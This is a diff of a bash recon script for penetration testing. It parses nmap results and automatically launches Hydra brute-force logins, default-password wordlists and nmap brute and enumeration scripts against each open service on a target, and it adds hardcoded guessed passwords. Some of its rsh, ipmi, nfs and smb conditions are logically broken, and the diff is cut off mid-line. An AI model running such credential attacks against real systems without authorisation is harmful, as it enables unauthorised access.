@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20180516 Kirby
+# 20180520 Kirby
 
 umask 077
 
@@ -14,6 +14,23 @@ function MAIN()
     local rawport
     local proto
     local ssl
+    local line
+    local fields
+    local portinfo=()
+    local d
+    local state
+    local protocol
+    local owner
+    local service
+    local rpc_info
+    local version
+    local TCPPORTS=()
+    local SSLPORTS=()
+    local NONSSLPORTS=()
+    local UDPPORTS=()
+    local sapflag=0
+    local RMIPORTS=()
+    local rmiflag=0
     
     export TARGET=$1 
     export RECONDIR="${HOME}/mkrecon/${TARGET}"
@@ -61,6 +78,351 @@ function MAIN()
     echo "... outputs $RECONDIR/${TARGET}.basicEyeWitness"
     basicEyeWitness &
     
+    echo "examining open ports"
+    echo "... outputs $RECONDIR/${TARGET}.baseurls"
+    echo "... outputs $RECONDIR/${TARGET}.port.certificate"
+    IFS=$'\n'
+    for line in $(egrep '\sPorts:\s' "$RECONDIR"/${TARGET}.ngrep |sed -e 's/.*Ports: //')
+    do
+        IFS=','
+        for fields in $line
+        do
+            portinfo=()
+            IFS='/'
+            for d in $fields
+            do
+                portinfo[${#portinfo[@]}]="$d"
+            done
+            IFS=$'\n'
+            port="${portinfo[0]// /}"
+            state=${portinfo[1]}
+            protocol=${portinfo[2]}
+            owner=${portinfo[3]}
+            service=${portinfo[4]}
+            rpc_info=${portinfo[5]}
+            version=${portinfo[6]}
+
+            if [[ $state =~ filtered ]]
+            then
+                continue
+            fi
+
+            if [[ $version =~ Splunkd ]]
+            then
+                continue
+            fi
+
+            if [[ $protocol == 'tcp' ]] 
+            then
+                TCPPORTS[${#TCPPORTS[@]}]=$port
+            fi
+
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ ssl ]]
+            then
+                SSLPORTS[${#SSLPORTS[@]}]=$port
+            else
+                NONSSLPORTS[${#NONSSLPORTS[@]}]=$port
+            fi
+
+            if [[ $protocol == 'udp' ]] 
+            then
+                UDPPORTS[${#UDPPORTS[@]}]=$port
+            fi
+
+            echo "examining port $port"
+        
+            # web
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'http' ]]
+            then
+                echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+            fi
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ ssl.http ]]
+            then
+                echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+            fi
+    
+            # sometimes nmap can't identify a web service, so just try anyways
+            if [[ $protocol == 'tcp' ]] \
+            && echo "... testing $port for http with wget" \
+            && timeout --kill-after=10 --foreground 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
+                --method=HEAD http://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
+            && ! grep -q "http://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
+            then
+                echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+            fi
+            if [[ $protocol == 'tcp' ]] \
+            && echo "... testing $port for https with wget" \
+            && timeout --kill-after=10 --foreground 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
+                --method=HEAD https://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
+            && ! grep -q "https://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
+            then
+                echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+            fi
+    
+            # check for SSL/TLS
+            if [[ $protocol == 'tcp' ]] \
+            && echo "... testing $port for ssl/tls with openssl" \
+            && echo quit|timeout --kill-after=10 --foreground 30 openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null |grep CERTIFICATE >/dev/null 2>&1
+            then
+                echo quit|timeout --kill-after=10 --foreground 30 openssl s_client -showcerts -connect ${TARGET}:${port} > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
+                ssl=1
+                proto="https"
+            else
+                ssl=0
+                proto="http"
+            fi
+    
+            # ftp
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'ftp' ]]
+            then
+                echo "starting doHydra $port ftp"
+                echo "... outputs $RECONDIR/${TARGET}.ftp.$port.hydra"
+                doHydra $port ftp /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt &
+                doHydra $port ftp /usr/share/routersploit/routersploit/wordlists/defaults.txt &
+            fi
+        
+            # telnet
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'telnet' ]]
+            then
+                echo "starting doHydra $port telnet"
+                echo "... outputs $RECONDIR/${TARGET}.telnet.$port.hydra"
+                doHydra $port telnet /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt &
+                doHydra $port telnet /usr/share/routersploit/routersploit/wordlists/defaults.txt &
+            fi
+        
+            # ssh
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'ssh' ]]
+            then
+                echo "starting doHydra $port ssh"
+                echo "... outputs $RECONDIR/${TARGET}.ssh.$port.hydra"
+                doHydra $port ssh /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt &
+                doHydra $port ssh /usr/share/routersploit/routersploit/wordlists/defaults.txt &
+            fi
+        
+            # mssql
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'ms-sql' ]]
+            then
+                echo "starting doHydra $port mssql"
+                echo "... outputs $RECONDIR/${TARGET}.mssql.$port.hydra"
+                doHydra $port mssql /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt &
+            fi
+        
+            # mysql
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'mysql' ]]
+            then
+                echo "starting doHydra $port mysql"
+                echo "... outputs $RECONDIR/${TARGET}.mysql.$port.hydra"
+                doHydra $port mysql /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt &
+            fi
+        
+            # oracle
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'oracle-tns' ]]
+            then
+                echo "starting doHydra $port oracle"
+                echo "... outputs $RECONDIR/${TARGET}.oracle.$port.hydra"
+                doHydra $port oracle-listener /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt &
+                doHydra $port oracle-listener "$RECONDIR"/tmp/oracle-default-accounts.lst &
+            fi
+    
+            # vnc
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'vnc' ]]
+            then
+                echo "starting passHydra $port vnc"
+                echo "... outputs $RECONDIR/${TARGET}.vnc.$port.hydra"
+                passHydra $port vnc /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt &
+            fi
+    
+            # rsh
+            if [[ $protocol == '514' ]] \
+            && [[ $protocol == 'tcp' ]] 
+            then
+                echo "starting rshBrute"
+                echo "... outputs $RECONDIR/${TARGET}.rsh"
+                rshBrute &
+            fi
+        
+            # nfs
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ mountd ]] \
+            || [[ $service =~ nfs ]] 
+            then
+                echo "starting nfsScan"
+                echo "... outputs $RECONDIR/${TARGET}.showmount-e if anything found"
+                echo "... outputs $RECONDIR/${TARGET}.showmount-a if anything found"
+                echo "... outputs $RECONDIR/${TARGET}.nfsls if anything found"
+                nfsScan &
+            fi
+    
+            # ipmi
+            if [[ $protocol == '623' ]] \
+            && [[ $protocol == 'tcp' ]] 
+            then
+                echo "starting ipmiScan"
+                echo "... outputs $RECONDIR/${TARGET}.ipmi.hashcat"
+                echo "... outputs $RECONDIR/${TARGET}.ipmi.john"
+                echo "... outputs $RECONDIR/${TARGET}.ipmi.john.cracked"
+                ipmiScan &
+            fi
+        
+            # memcache
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ memcached ]] 
+            then
+                echo "starting memcacheScan"
+                echo "... outputs $RECONDIR/${TARGET}.msf.memcached.${port}.out"
+                memcacheScan $port &
+            fi
+        
+            # dns
+            if [[ $port == '53' ]] \
+            && [[ $protocol == 'udp' ]] \
+            && [[ $service == 'domain' ]] 
+            then
+                echo "starting dnsScan"
+                echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.local"
+                echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.rfc1918"
+                echo "... outputs $RECONDIR/${TARGET}.dnsenum"
+                echo "... outputs $RECONDIR/${TARGET}.dnsrecon"
+                echo "... outputs $RECONDIR/${TARGET}.host-a"
+                echo "... outputs $RECONDIR/${TARGET}.host-l"
+                echo "... outputs $RECONDIR/${TARGET}.arpas/"
+                echo "... outputs $RECONDIR/${TARGET}.domains"
+                dnsScan &
+            fi
+        
+            # ike
+            if [[ $protocol == 'udp' ]] \
+            && [[ $service == 'isakmp' ]] 
+            then
+                echo "starting ikeScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.${port}.ike-scan"
+                ikeScan $port &
+            fi
+        
+            # rsync
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'rsync' ]] 
+            then
+                echo "starting rsyncScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.${port}.rsync"
+                echo "... outputs $RECONDIR/${TARGET}.${port}.rsync-\$share"
+                rsyncScan $port &
+            fi
+        
+            # cifs/smb
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $port == '445' ]] \
+            && [[ $service == 'microsoft-ds' ]] \
+            || [[ $service == 'netbios-ssn' ]] 
+            then
+                echo "starting smbScan"
+                echo "... outputs $RECONDIR/${TARGET}.smbshares"
+                echo "... outputs $RECONDIR/${TARGET}.smbdirs"
+                echo "... outputs $RECONDIR/${TARGET}.rpcclient"
+                smbScan &
+            fi
+        
+            # redis
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'redis' ]] 
+            then
+                echo "starting redisScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.redis.${port}"
+                redisScan $port &
+            fi
+        
+            # ldap
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'ldap' ]] 
+            then
+                echo "starting ldapScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.ldap.${port}"
+                echo "... outputs $RECONDIR/${TARGET}.ldap.${port}.\$context"
+                ldapScan $port &
+            fi
+    
+            # elasticsearch
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $version == 'Elasticsearch' ]] 
+            then
+                echo "starting elasticsearchScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}"
+                echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}.\$index"
+                elasticsearchScan $port $proto &
+            fi
+        
+            # iscsi
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service == 'iscsi' ]] 
+            then
+                echo "starting iscsiScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.iscsiadm.${port}"
+                iscsiScan $port &
+            fi
+
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $version =~ SAP ]] 
+            then
+                sapflag=1
+            fi
+        
+            if [[ $version =~ Java.RMI ]] \
+            || [[ $service =~ java-rmi ]] \
+            || [[ $service =~ rmiregistry ]] 
+            then
+                rmiflag=1
+                RMIPORTS[${#RMIPORTS[@]}]=$port
+            fi
+        
+            # docker
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $version =~ Docker ]]
+            then
+                echo "starting dockerScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.dockerinfo.${port}"
+                echo "... outputs $RECONDIR/${TARGET}.dockernetworks.${port}"
+                echo "... outputs $RECONDIR/${TARGET}.dockercontainers.${port}"
+                echo "... outputs $RECONDIR/dockertop.${port}.${id}"
+                echo "... outputs $RECONDIR/dockerchanges.${port}.${id}"
+                echo "... outputs $RECONDIR/dockershadow.${port}.${id}"
+                echo "... outputs $RECONDIR/${TARGET}.dockerepo.${port}"
+                dockerScan $port $proto 
+            fi
+
+            # postgres
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ postgresql ]]
+            then
+                echo "starting postgresqlScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.postgresql.$port"
+                postgresqlScan $port &
+    
+                echo "starting postgresqlHydra for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.postgresql.$port.hydra"
+                doHydra $port postgres /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt &
+            fi
+    
+            # mysql
+            if [[ $protocol == 'tcp' ]] \
+            && [[ $service =~ mysql ]]
+            then
+                echo "starting mysqlScan for port $port"
+                echo "... outputs $RECONDIR/${TARGET}.mysql.$port"
+                mysqlScan $port &
+            fi
+        done
+    done
+
     echo "starting otherNmaps"
     echo "... outputs $RECONDIR/${TARGET}.nmap-auth"
     echo "... outputs $RECONDIR/${TARGET}.nmap-exploitvuln"
@@ -71,269 +433,20 @@ function MAIN()
     echo "... outputs $RECONDIR/${TARGET}.nmap-ipmi-brute"
     otherNmaps &
 
-    echo "examining open ports"
-    echo "... outputs $RECONDIR/${TARGET}.baseurls"
-    echo "... outputs $RECONDIR/${TARGET}.port.certificate"
-    for rawport in $(egrep 'Ports: ' "$RECONDIR"/${TARGET}.ngrep)
-    do  
-        if ! echo $rawport |egrep -q '[[:digit:]]+/open/'
-        then
-            continue
-        fi  
+    if [[ $sapflag == 1 ]]
+    then
+        echo "starting sapScan"
+        echo "... outputs $RECONDIR/${TARGET}.sap"
+        sapScan &
+    fi
 
-        port=${rawport%%/*}
-        echo "examining port $port"
-    
-        # web
-        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp//http'
-        then
-            echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
-        fi
-        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp//ssl.http'
-        then
-            echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
-        fi
+    if [[ $rmiflag == 1 ]]
+    then
+        echo "starting rmiScan"
+        echo "... outputs $RECONDIR/${TARGET}.rmi"
+        rmiScan &
+    fi
 
-        # sometimes nmap can't identify a web service, so just try anyways
-        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
-        && echo "... testing $port for http with wget" \
-        && $TIMEOUT 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
-            --method=HEAD http://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
-        && ! grep -q "http://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
-        then
-            echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
-        fi
-        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
-        && echo "... testing $port for https with wget" \
-        && $TIMEOUT 30 wget --tries=2 -O /dev/null --no-check-certificate -S  -D $TARGET \
-            --method=HEAD https://${TARGET}:${port} 2>&1 |egrep -qi 'HTTP/|X-|Content|Date' \
-        && ! grep -q "https://${TARGET}:${port}" "$RECONDIR"/${TARGET}.baseurls >/dev/null 2>&1
-        then
-            echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
-        fi
-
-        # check for SSL/TLS
-        if echo $rawport |grep -v Splunkd |egrep -q '[[:digit:]]+/open/tcp/' 2>/dev/null \
-        && echo "... testing $port for ssl/tls with openssl" \
-        && echo quit|$TIMEOUT 30 openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null |grep CERTIFICATE >/dev/null 2>&1
-        then
-            echo quit|$TIMEOUT 30 openssl s_client -showcerts -connect ${TARGET}:${port} > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
-            ssl=1
-            proto="https"
-        else
-            ssl=0
-            proto="http"
-        fi
-
-        # ftp
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ftp/'
-        then
-            echo "starting doHydra $port ftp"
-            echo "... outputs $RECONDIR/${TARGET}.ftp.$port.hydra"
-            doHydra $port ftp /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt &
-            doHydra $port ftp /usr/share/routersploit/routersploit/wordlists/defaults.txt &
-        fi
-    
-        # telnet
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//telnet'
-        then
-            echo "starting doHydra $port telnet"
-            echo "... outputs $RECONDIR/${TARGET}.telnet.$port.hydra"
-            doHydra $port telnet /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt &
-            doHydra $port telnet /usr/share/routersploit/routersploit/wordlists/defaults.txt &
-        fi
-    
-        # ssh
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ssh'
-        then
-            echo "starting doHydra $port ssh"
-            echo "... outputs $RECONDIR/${TARGET}.ssh.$port.hydra"
-            doHydra $port ssh /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt &
-            doHydra $port ssh /usr/share/routersploit/routersploit/wordlists/defaults.txt &
-        fi
-    
-        # mssql
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ms-sql'
-        then
-            echo "starting doHydra $port mssql"
-            echo "... outputs $RECONDIR/${TARGET}.mssql.$port.hydra"
-            doHydra $port mssql /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt &
-        fi
-    
-        # mysql
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//mysql'
-        then
-            echo "starting doHydra $port mysql"
-            echo "... outputs $RECONDIR/${TARGET}.mysql.$port.hydra"
-            doHydra $port mysql /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt &
-        fi
-    
-        # oracle
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//oracle-tns'
-        then
-            echo "starting doHydra $port oracle"
-            echo "... outputs $RECONDIR/${TARGET}.oracle.$port.hydra"
-            doHydra $port oracle-listener /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt &
-            doHydra $port oracle-listener "$RECONDIR"/tmp/oracle-default-accounts.lst &
-        fi
-
-        # vnc
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//vnc'
-        then
-            echo "starting passHydra $port vnc"
-            echo "... outputs $RECONDIR/${TARGET}.vnc.$port.hydra"
-            passHydra $port vnc /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt &
-        fi
-
-        # rsh
-        if echo $rawport |egrep -q '^514/open'
-        then
-            echo "starting rshBrute"
-            echo "... outputs $RECONDIR/${TARGET}.rsh"
-            rshBrute &
-        fi
-    
-        # nfs
-        if echo $rawport |egrep -q '/open/tcp//mountd' \
-        || echo $rawport |egrep -q '/open/tcp//nfs'
-        then
-            echo "starting nfsScan"
-            echo "... outputs $RECONDIR/${TARGET}.showmount-e if anything found"
-            echo "... outputs $RECONDIR/${TARGET}.showmount-a if anything found"
-            echo "... outputs $RECONDIR/${TARGET}.nfsls if anything found"
-            nfsScan &
-        fi
-
-        # ipmi
-        if echo $rawport |egrep -q '^623/open/tcp'
-        then
-            echo "starting ipmiScan"
-            echo "... outputs $RECONDIR/${TARGET}.ipmi.hashcat"
-            echo "... outputs $RECONDIR/${TARGET}.ipmi.john"
-            echo "... outputs $RECONDIR/${TARGET}.ipmi.john.cracked"
-            ipmiScan &
-        fi
-    
-        # memcache
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//memcached'
-        then
-            echo "starting memcacheScan"
-            echo "... outputs $RECONDIR/${TARGET}.msf.memcached.${port}.out"
-            memcacheScan $port &
-        fi
-    
-        # dns
-        if echo $rawport |egrep -q '53/open/udp//domain'
-        then
-            echo "starting dnsScan"
-            echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.local"
-            echo "... outputs $RECONDIR/${TARGET}.dnsreconptr.rfc1918"
-            echo "... outputs $RECONDIR/${TARGET}.dnsenum"
-            echo "... outputs $RECONDIR/${TARGET}.dnsrecon"
-            echo "... outputs $RECONDIR/${TARGET}.host-a"
-            echo "... outputs $RECONDIR/${TARGET}.host-l"
-            echo "... outputs $RECONDIR/${TARGET}.arpas/"
-            echo "... outputs $RECONDIR/${TARGET}.domains"
-            dnsScan &
-        fi
-    
-        # ike
-        if echo $rawport |egrep -q '[[:digit:]]+/open/udp//isakmp'
-        then
-            echo "starting ikeScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.${port}.ike-scan"
-            ikeScan $port &
-        fi
-    
-        # rsync
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//rsync'
-        then
-            echo "starting rsyncScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.${port}.rsync"
-            echo "... outputs $RECONDIR/${TARGET}.${port}.rsync-\$share"
-            rsyncScan $port &
-        fi
-    
-        # cifs/smb
-        if echo $rawport |egrep -q '445/open/tcp//microsoft-ds' \
-        || echo $rawport |egrep -q '445/open/tcp//netbios-ssn'
-        then
-            echo "starting smbScan"
-            echo "... outputs $RECONDIR/${TARGET}.smbshares"
-            echo "... outputs $RECONDIR/${TARGET}.smbdirs"
-            echo "... outputs $RECONDIR/${TARGET}.rpcclient"
-            smbScan &
-        fi
-    
-        # redis
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//redis/'
-        then
-            echo "starting redisScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.redis.${port}"
-            redisScan $port &
-        fi
-    
-        # ldap
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//ldap/'
-        then
-            echo "starting ldapScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.ldap.${port}"
-            echo "... outputs $RECONDIR/${TARGET}.ldap.${port}.\$context"
-            ldapScan $port &
-        fi
-
-        # elasticsearch
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//http//Elasticsearch'
-        then
-            echo "starting elasticsearchScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}"
-            echo "... outputs $RECONDIR/${TARGET}.elasticsearch.indexes.${port}.\$index"
-            elasticsearchScan $port $proto &
-        fi
-    
-        # iscsi
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//iscsi'
-        then
-            echo "starting iscsiScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.iscsiadm.${port}"
-            iscsiScan $port
-        fi
-    
-        # docker
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//.*//Docker'
-        then
-            echo "starting dockerScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.dockerinfo.${port}"
-            echo "... outputs $RECONDIR/${TARGET}.dockernetworks.${port}"
-            echo "... outputs $RECONDIR/${TARGET}.dockercontainers.${port}"
-            echo "... outputs $RECONDIR/dockertop.${port}.${id}"
-            echo "... outputs $RECONDIR/dockerchanges.${port}.${id}"
-            echo "... outputs $RECONDIR/dockershadow.${port}.${id}"
-            echo "... outputs $RECONDIR/${TARGET}.dockerepo.${port}"
-            dockerScan $port $proto 
-        fi
-        # postgres
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//postgresql'
-        then
-            echo "starting postgresqlScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.postgresql.$port"
-            postgresqlScan $port &
-
-            echo "starting postgresqlHydra for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.postgresql.$port.hydra"
-            doHydra $port postgres /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt &
-        fi
-
-        # mysql
-        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//mysql'
-        then
-            echo "starting mysqlScan for port $port"
-            echo "... outputs $RECONDIR/${TARGET}.mysql.$port"
-            mysqlScan $port &
-        fi
-    
-    done
-    
     if [[ -f "$RECONDIR"/${TARGET}.baseurls ]]
     then
         echo "starting routersploitScan"
@@ -422,13 +535,14 @@ function MAIN()
     jobscount=0
     while jobs |grep -q Running
     do
-        echo "Jobs are still running.  Waiting $jobscount out of 240"
+        echo "Jobs are still running.  Waiting... $jobscount out of 240 minutes"
         jobs -l
         (( jobscount++ ))
         if [[ "$jobscount" -ge 240 ]]
         then
             echo "killing jobs"
             killHangs
+            IFS=$'\n'
             for job in $(jobs -l |awk '{print $2}')
             do
                 kill $job
@@ -493,7 +607,6 @@ function buildEnv()
         fi
     done
 
-    TIMEOUT='timeout --kill-after=10 --foreground'
     local rawtty=$(tty)
     TTY=${rawtty#*/*/}
     BORDER='################################################################################' 
@@ -543,7 +656,6 @@ function buildEnv()
             /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
             /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
             >> "$RECONDIR"/tmp/users.tmp 
-
         cat /usr/share/seclists/Passwords/Common-Credentials/best110.txt \
             /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
             /usr/share/seclists/Passwords/Common-Credentials/top-shortlist.txt \
@@ -557,6 +669,8 @@ function buildEnv()
         echo "j5Brn9" >> "$RECONDIR"/tmp/passwds.tmp
         echo "UNKNOWN" >> "$RECONDIR"/tmp/passwds.tmp
         echo "Password" >> "$RECONDIR"/tmp/passwds.tmp
+        echo "nimda" >> "$RECONDIR"/tmp/passwds.tmp
+        echo "admin1" >> "$RECONDIR"/tmp/passwds.tmp
 
         cat "$RECONDIR"/tmp/users.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/users.lst
         cat "$RECONDIR"/tmp/users.tmp "$RECONDIR"/tmp/passwds.tmp |dos2unix |sed -e 's/ //g' |sort -u > "$RECONDIR"/tmp/passwds.lst
@@ -628,67 +742,46 @@ function buildEnv()
 ################################################################################
 function otherNmaps()
 {
-    local a_tcpports=()
-    local a_udpports=()
-    local a_urls=()
-    local port
     local tcpports
     local udpports
     local scanports
     local sid
 
-    if [[ ! -f "$RECONDIR"/${TARGET}.ngrep ]]
-    then
-        echo "FAILED TO FIND NGREP FILE"
-        return 1
-    fi
-    for port in $(egrep 'Ports: ' "$RECONDIR"/${TARGET}.ngrep)
-    do
-        if echo $port |egrep -q '[[:digit:]]+/open/tcp/'
-        then
-            a_tcpports[${#a_tcpports[@]}]=${port%%/*}
-            tcpports="T:$(joinBy , "${a_tcpports[@]}")"
-        fi
-        if echo $port |egrep -q '[[:digit:]]+/open/udp/'
-        then
-            a_udpports[${#a_udpports[@]}]=${port%%/*}
-            udpports="U:$(joinBy , "${a_udpports[@]}")"
-        fi
-        scanports=$(joinBy , $tcpports $udpports)
-    done
+    tcpports="T:$(joinBy , "${TCPPORTS[@]}")"
+    udpports="U:$(joinBy , "${UDPPORTS[@]}")"
+    scanports=$(joinBy , $tcpports $udpports)
 
-    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=ajp-brute -oN "$RECONDIR"/${TARGET}.nmap-ajp-brute $TARGET |grep -q '|' \
+    ( timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -p $scanports --script=ajp-brute -oN "$RECONDIR"/${TARGET}.nmap-ajp-brute $TARGET |grep -q '|' \
         || rm -f "$RECONDIR"/${TARGET}.nmap-ajp-brute ) &
 
-    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=xmpp-brute -oN "$RECONDIR"/${TARGET}.nmap-xmpp-brute $TARGET |grep -q '|' \
+    ( timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -p $scanports --script=xmpp-brute -oN "$RECONDIR"/${TARGET}.nmap-xmpp-brute $TARGET |grep -q '|' \
         || rm -f "$RECONDIR"/${TARGET}.nmap-xmpp-brute ) &
 
-    ( $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script=oracle-sid-brute -oN "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute $TARGET |grep -q '|' 
+    ( timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -p $scanports --script=oracle-sid-brute -oN "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute $TARGET |grep -q '|' 
         if grep -q '|' "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute
         then
             for sid in $(awk '/^|/ {print $2}' "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute |grep -v oracle-sid-brute)
             do
-                $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=$sid -oN "$RECONDIR"/${TARGET}.nmap-oracle-brute-stealth.${sid} $TARGET &
-                $TIMEOUT 28800 nmap -T3 -Pn -p $scanports --script oracle-enum-users --script-args oracle-enum-users.sid=$sid,userdb=$RECONDIR/tmp/users.lst -oN "$RECONDIR"/${TARGET}.nmap-oracle-enum-users.${sid} $TARGET &
+                timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -p $scanports --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=$sid -oN "$RECONDIR"/${TARGET}.nmap-oracle-brute-stealth.${sid} $TARGET &
+                timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -p $scanports --script oracle-enum-users --script-args oracle-enum-users.sid=$sid,userdb=$RECONDIR/tmp/users.lst -oN "$RECONDIR"/${TARGET}.nmap-oracle-enum-users.${sid} $TARGET &
             done
         else
             rm -f "$RECONDIR"/${TARGET}.nmap-oracle-sid-brute 
         fi
     ) &
 
-    ( $TIMEOUT 28800 nmap -T3 -Pn -sU --script ipmi-brute -p 623 -oN "$RECONDIR"/${TARGET}.nmap-ipmi-brute $TARGET |grep -q '|' \
+    ( timeout --kill-after=10 --foreground 28800 nmap -T3 -Pn -sU --script ipmi-brute -p 623 -oN "$RECONDIR"/${TARGET}.nmap-ipmi-brute $TARGET |grep -q '|' \
         || rm -f "$RECONDIR"/${TARGET}.nmap-ipmi-brute ) &
 
-    screen -dmS ${TARGET}.nmap-auth.$RANDOM $TIMEOUT 28800 \
+    screen -dmS ${TARGET}.nmap-auth.$RANDOM timeout --kill-after=10 --foreground 28800 \
